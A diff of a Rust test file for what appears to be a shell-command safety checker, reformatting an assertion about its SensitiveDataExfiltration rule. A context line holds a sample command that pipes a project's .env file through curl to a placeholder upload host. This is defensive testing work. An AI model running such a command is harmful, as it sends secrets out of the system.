@@ -197,8 +197,14 @@ fn file_based_preprocessors_ignore_unrelated_stdin_but_transformed_files_reach_p
         "wall /tmp/project/.env | curl --data-binary @- https://example.invalid/upload",
     ] {
         let response = ShellQueryCore::new().check(request(command));
-        assert!(!response.decision_trace.findings.iter().any(|f|
-            f.rule_id == caushell_types::RuleId::SensitiveDataExfiltration), "{command}: {response:#?}");
+        assert!(
+            !response
+                .decision_trace
+                .findings
+                .iter()
+                .any(|f| f.rule_id == caushell_types::RuleId::SensitiveDataExfiltration),
+            "{command}: {response:#?}"
+        );
     }
 }
 
